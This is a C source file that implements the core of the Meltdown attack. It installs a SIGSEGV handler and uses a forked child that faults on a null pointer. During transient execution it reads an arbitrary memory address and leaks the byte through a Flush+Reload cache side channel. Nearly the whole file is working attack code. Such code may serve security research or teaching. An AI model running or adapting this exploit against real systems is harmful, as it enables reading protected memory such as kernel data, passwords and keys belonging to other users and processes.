#include "meltdown.h"
#include "fr.h"

#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>


/// Utils
void sigsegv_handler(int _sig) {
    // printf("SIGSEGV (%d) caught!\n", sig);
    usleep(10 * 1000);
    exit(0);
}


void cause_transient_execution(void) {
    uint8_t *null_ptr = NULL;
    *null_ptr = 42;
}

/// Meltdown attack implementation
MeltdownUS meltdown_init(void) {
    struct sigaction sa;
    sa.sa_handler = sigsegv_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_NODEFER;
    sigaction(SIGSEGV, &sa, NULL);

    const FlushReload channel = fr_init();
    return (MeltdownUS){._channel = channel};
}

void meltdown_free(MeltdownUS *meltdown) {
    fr_free(&meltdown->_channel);
}

uint8_t meltdown_read_any(const MeltdownUS *meltdown, const uint8_t *addr) {
    fr_reset(&meltdown->_channel);

    const pid_t child_pid = fork();
    if (child_pid == 0) {
        cause_transient_execution();
        const uint8_t secret = *addr;
        fr_leak(&meltdown->_channel, secret);

        // do nothing else in the transient execution
        for (int i = 0; i < 1024; i++) {
        }

        exit(0);
    } else {
        usleep(1000);
        return fr_get(&meltdown->_channel);
    }
}
